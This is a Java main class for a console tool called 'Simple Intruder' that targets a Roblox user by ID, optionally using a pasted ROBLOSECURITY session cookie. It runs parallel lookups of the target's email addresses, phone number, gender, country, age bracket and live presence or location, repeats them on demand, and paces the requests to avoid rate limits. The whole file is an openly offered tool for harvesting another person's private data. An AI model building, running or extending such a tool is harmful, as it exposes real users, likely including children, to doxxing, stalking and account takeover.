package net.mawborne;

import net.mawborne.api.*;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.net.http.HttpClient;

import java.io.Console;
import java.time.Duration;

import java.util.Arrays;
import java.util.Scanner;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CountDownLatch;

public class Main {
    private static final Logger LOGGER = LogManager.getLogger(Main.class);
    private static final ObjectMapper MAPPER = new ObjectMapper();

    public static final String APP_VERSION = "V1";
    public static final String APP_NAME = "Simple Intruder";

    private static final HttpClient CLIENT = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.NORMAL)
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    public static void main(String[] args) {
        sendTag();
        CompletableFuture<String> ipTask = NetworkUtils.getPublicIPAsync(CLIENT);

        Users userService = new Users(CLIENT, MAPPER);
        Presence presenceService = new Presence(CLIENT, MAPPER);
        Gender genderService = new Gender(CLIENT, MAPPER);
        Email emailService = new Email(CLIENT, MAPPER);
        Phone phoneService = new Phone(CLIENT, MAPPER);

        try (Scanner userInput = new Scanner(System.in)) {
            LOGGER.info("Running with IP: {}", ipTask.join());

            long userId = getValidLongInput(userInput, "Target UserId: ");
            String useAuth = getValidInput(userInput, "Use authenticated request? (ROBLOSECURITY Cookie) [y/n]: ", "y", "n");
            String cookie = useAuth.equals("y") ? captureCookie(userInput) : "";

            label:
            while (true) {
                long startTime = System.currentTimeMillis();

                UserData sessionUser = UserData.createEmpty(userId);

                var presenceTask = presenceService.getUserPresence(cookie, sessionUser);
                var genderTask = genderService.getUserGender(cookie, sessionUser);

                var usersTask = userService.getUserData(cookie, sessionUser);
                var countryCodeTask = userService.getCountryCode(cookie, sessionUser);
                var ageBracketTask = userService.getAgeBracket(cookie, sessionUser);

                var emailTask = emailService.getUserEmail(cookie, sessionUser);
                var emailsTask = emailService.getUserEmails(cookie, sessionUser);

                var phoneTask = phoneService.getUserPhone(cookie, sessionUser);

                CompletableFuture.allOf(presenceTask, genderTask, usersTask, countryCodeTask, ageBracketTask, emailTask, emailsTask, phoneTask).join();

                var joinedUserTask = usersTask.join();
                var joinedPresenceTask = presenceTask.join();
                var joinedGenderTask = genderTask.join();
                var joinedCountryCodeTask = countryCodeTask.join();
                var joinedAgeBracketTask = ageBracketTask.join();
                var joinedEmailTask = emailTask.join();
                var joinedEmailsTask = emailsTask.join();
                var joinedPhoneTask = phoneTask.join();

                sessionUser = new UserData(
                        joinedUserTask.username(),
                        joinedUserTask.displayName(),
                        joinedUserTask.description(),
                        joinedGenderTask.gender(),
                        joinedUserTask.created(),
                        joinedCountryCodeTask.countryCode(),
                        joinedAgeBracketTask.ageBracket(),

                        joinedEmailTask.currentEmail(),
                        joinedEmailTask.isVerified(),
                        joinedEmailTask.canBypass(),
                        joinedEmailsTask.pendingEmail(),

                        joinedPhoneTask.phonePrefix(),
                        joinedPhoneTask.phone(),
                        joinedPhoneTask.phoneVerified(),
                        joinedPhoneTask.codeLength(),

                        joinedPresenceTask.currentStatus(),
                        joinedPresenceTask.lastLocation(),
                        joinedPresenceTask.gameId(),
                        joinedPresenceTask.placeId(),
                        joinedPresenceTask.universeId(),

                        joinedUserTask.userId(),
                        joinedUserTask.isBanned(),
                        joinedUserTask.hasVerifiedBadge()
                );

                sendTag();
                LOGGER.info(sessionUser);
                LOGGER.info("Total processing time: {}ms", (System.currentTimeMillis() - startTime));

                String newTask = getValidInput(userInput, "Perform next task: [again/new user/kill]: ", "again", "new user", "kill");

                switch (newTask) {
                    case "kill":
                        LOGGER.info("Shutting down...");
                        break label;

                    case "new user":
                        userId = getValidLongInput(userInput, "New Target UserId: ");
                        String changeCookie = getValidInput(userInput, "Change/Update Cookie? [y/n]: ", "y", "n");

                        if (changeCookie.equals("y")) {
                            cookie = captureCookie(userInput);
                        }
                        break;

                    case "again":
                        long endTime = System.currentTimeMillis();
                        long timeTaken = endTime - startTime;
                        long targetBuffer = 15000;

                        if (timeTaken < targetBuffer) {
                            long remainingWait = targetBuffer - timeTaken;
                            LOGGER.info("Cooling down to prevent rate limits... {}s remaining", remainingWait / 1000);

                            CountDownLatch latch = new CountDownLatch(1);

                            try {
                                boolean releasedManually = latch.await(remainingWait, java.util.concurrent.TimeUnit.MILLISECONDS);

                                if (releasedManually) {
                                    LOGGER.debug("Cooldown interrupted early.");
                                }
                            } catch (InterruptedException e) {
                                LOGGER.error("Cooldown interrupted by system: {}", e.getMessage());
                                Thread.currentThread().interrupt();
                            }
                        }
                        break;
                }

            }
        } catch (Exception error) {
            LOGGER.error("A fatal error occurred: {}", error.getMessage(), error);
        }
    }

    private static String captureCookie(Scanner userInput) {
        Console console = System.console();

        if (console != null) {
            char[] buffer = console.readPassword("Paste ROBLOSECURITY (Invisible): ");
            String cookie = new String(buffer);

            Arrays.fill(buffer, ' '); // Erases in the GC
            LOGGER.info("[SECURE] Cookie captured.");
            return cookie;
        }

        System.out.print("Enter Cookie: ");
        return userInput.nextLine().trim();
    }

    private static String getValidInput(Scanner scanner, String message, String... validOptions) {
        while (true) {
            System.out.print(message);
            String input = scanner.nextLine().trim().toLowerCase();

            for (String option : validOptions) {
                if (input.equals(option)) return input;
            }

            LOGGER.warn("Invalid choice. Try: {}", String.join("/", validOptions));
        }
    }

    private static long getValidLongInput(Scanner scanner, String message) {
        while (true) {
            System.out.print(message);
            String input = scanner.nextLine().trim();

            try {
                long val = Long.parseLong(input);
                if (val > 0) return val;
            } catch (NumberFormatException _) {}

            LOGGER.warn("Please enter a valid positive ID.");
        }
    }

    private static void sendTag() {
        LOGGER.info("-".repeat(35));
        LOGGER.info("{} {}! By mawborn/@killserver on discord! ^_^", APP_NAME, APP_VERSION);
        LOGGER.info("-".repeat(35));
    }
}